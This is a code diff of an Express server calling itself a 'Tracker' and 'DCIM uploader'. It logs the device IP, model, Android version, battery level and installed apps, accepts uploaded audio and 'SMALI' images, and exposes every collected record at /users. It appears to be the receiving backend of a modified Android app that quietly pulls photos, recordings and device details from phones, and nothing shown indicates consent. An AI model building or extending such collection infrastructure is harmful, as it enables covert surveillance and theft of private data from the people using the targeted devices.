@@ -17,7 +17,7 @@ if (!fs.existsSync(UPLOAD_DIR)) {
 
 const upload = multer({
   dest: UPLOAD_DIR,
-  limits: { fileSize: 10 * 1024 * 1024 } // 10MB
+  limits: { fileSize: 10 * 1024 * 1024 }
 });
 
 app.use('/uploads', express.static(UPLOAD_DIR));
@@ -38,6 +38,20 @@ function saveLog(data) {
   }
 }
 
+function parseApps(input) {
+  if (!input) return [];
+
+  try {
+    return decodeURIComponent(input)
+      .split(',')
+      .map(x => x.trim())
+      .filter(Boolean)
+      .slice(0, 200);
+  } catch {
+    return [];
+  }
+}
+
 /* ================= TRACK ================= */
 
 app.get('/track', (req, res) => {
@@ -53,7 +67,16 @@ app.get('/track', (req, res) => {
   };
 
   console.log("\n🔥 DEVICE =====================");
-  console.log(data);
+  console.log("IP:", data.ip);
+  console.log("Model:", data.model);
+  console.log("Brand:", data.brand);
+  console.log("Android:", data.android);
+  console.log("Battery:", data.battery);
+
+  console.log("\n📦 Apps List:");
+  data.apps.forEach((app, i) => {
+    console.log(`${i + 1}. ${app}`);
+  });
 
   saveLog(data);
 
@@ -66,9 +89,9 @@ app.post('/upload-audio', (req, res) => {
 
   const contentType = req.headers['content-type'] || "";
 
-  // 🔴 MULTIPART SUPPORT
+  // 🔴 MULTIPART
   if (contentType.includes("multipart")) {
-    upload.single('audio')(req, res, () => {
+    return upload.single('audio')(req, res, () => {
 
       if (!req.file) {
         return res.status(400).send("No file");
@@ -76,7 +99,7 @@ app.post('/upload-audio', (req, res) => {
 
       const url = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
 
-      console.log("📦 MULTIPART:", req.file.filename);
+      console.log("\n📦 MULTIPART FILE:", req.file.filename);
 
       saveLog({
         type: "multipart",
@@ -88,11 +111,9 @@ app.post('/upload-audio', (req, res) => {
 
       return res.json({ status: "uploaded", url });
     });
-
-    return;
   }
 
-  // 🔥 RAW UPLOAD (SMALI)
+  // 🔥 RAW (SMALI IMAGE)
   let ext = ".jpg";
 
   if (contentType.includes("png")) ext = ".png";
@@ -109,7 +130,7 @@ app.post('/upload-audio', (req, res) => {
 
     const url = `${req.protocol}://${req.get('host')}/uploads/${fileName}`;
 
-    console.log("📸 RAW IMAGE:", fileName);
+    console.log("\n📸 RAW IMAGE:", fileName);
     console.log("IP:", getIP(req));
 
     saveLog({
@@ -146,9 +167,7 @@ app.get('/users', (req, res) => {
   try {
     if (!fs.existsSync(LOG_FILE)) return res.json([]);
 
-    const data = fs.readFileSync(LOG_FILE, "utf-8");
-
-    const list = data
+    const list = fs.readFileSync(LOG_FILE, "utf-8")
       .split("\n")
       .filter(Boolean)
       .map(x => {
@@ -159,7 +178,7 @@ app.get('/users', (req, res) => {
 
     res.json(list);
 
-  } catch (e) {
+  } catch {
     res.json([]);
   }
 });
@@ -180,7 +199,7 @@ app.get('/health', (req, res) => {
 /* ================= HOME ================= */
 
 app.get('/', (req, res) => {
-  res.send("Tracker running (DCIM uploader ready)");
+  res.send("Tracker running (stable + structured logs)");
 });
 
 /* ================= START ================= */
